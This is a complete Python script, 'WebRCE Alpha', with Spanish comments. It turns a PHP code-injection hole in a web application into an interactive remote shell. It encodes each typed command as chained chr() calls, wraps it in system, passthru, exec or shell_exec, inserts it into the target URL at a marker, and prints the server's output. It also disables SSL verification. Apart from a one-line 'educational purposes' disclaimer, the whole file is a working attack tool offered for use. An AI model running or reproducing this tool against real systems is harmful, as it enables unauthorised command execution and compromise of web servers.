#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Libs
import pycurl
from io import BytesIO

print ('################################################################')
print ('# Welcome to WebRCE Alpha release.')
print ('# Utility to get remote shell from PHP Command Execution')
print ('# by Kamal Majaiti')
print ('# Description: Utility for execute comands enconding to PHP code.')
print ('# https://github.com/')
print ('################################################################')
print ('Provided only for educational or information purposes\n')



def RealizarPeticionWeb( url ):   
    "Realiza la peticion web con el exploit codificado."
    HTML=''
    CuerpoHTML = BytesIO()
    PunteroCurl = pycurl.Curl()
    PunteroCurl.setopt(PunteroCurl.URL, url )
    PunteroCurl.setopt(PunteroCurl.WRITEDATA, CuerpoHTML)
    PunteroCurl.setopt(PunteroCurl.SSL_VERIFYPEER, 0) 
    PunteroCurl.setopt(PunteroCurl.SSL_VERIFYHOST, 0) 
    PunteroCurl.perform()
    PunteroCurl.close()
    HTML=CuerpoHTML.getvalue()
    return HTML.decode('UTF-8')


def InjectarExploitEnURL ( URL , ExpleoitPayload):
    "Carga el exploit en la URL."
    return URL.replace('#exploit#', ExpleoitPayload)


def ComandoACaracterPHP ( comando ):
    "Esta funcion convierte los comandos en llamadas de la funcion CHAR() de php y lo devuelve como string." 
    Payload=''
    for LETRA in comando:
        CodigoAsci=str(ord(LETRA))
        Payload=Payload+'chr('+CodigoAsci+').'
    return Payload[:-1]
url = input('Introduce la URL e indica la ubicacion donde injectar el exploit mediante la marca #exploit# ejemplo: \n http://example.org/search.php?param1=abc&param2=#exploit#\nurl:')
# Menu para elegir la funcion de ejecucion en PHP
funcionesPHP = {}
funcionesPHP['1']="system" 
funcionesPHP['2']="passthru"
funcionesPHP['3']="exec"
funcionesPHP['4']="shell_exec"
print('Elige la funcion con la que ejecutar el codigo en PHP:\nOpcion 1: system\nOpcion 2: passthru\nOpcion 3: exec\nOpcion 4: shell_exec')
NfuncionPHP=input('Funcion PHP a usar [1-4]:')
funcionPHP=funcionesPHP[NfuncionPHP]
print ('Se usara: '+funcionPHP+'\n')



comando=''
print ('Introduce "exit" para salir.\n')
while comando != 'exit':
    comando    = input("Remote Shell Command:")
    ComandoEnPHP=ComandoACaracterPHP ( comando )
    Exploit=funcionPHP+'('+ComandoEnPHP+')'
    URLConExploit=InjectarExploitEnURL (url, Exploit)
    ResultadoPeticionWeb =''
    ResultadoPeticionWeb = RealizarPeticionWeb( URLConExploit )
    print ( ResultadoPeticionWeb )
quit()



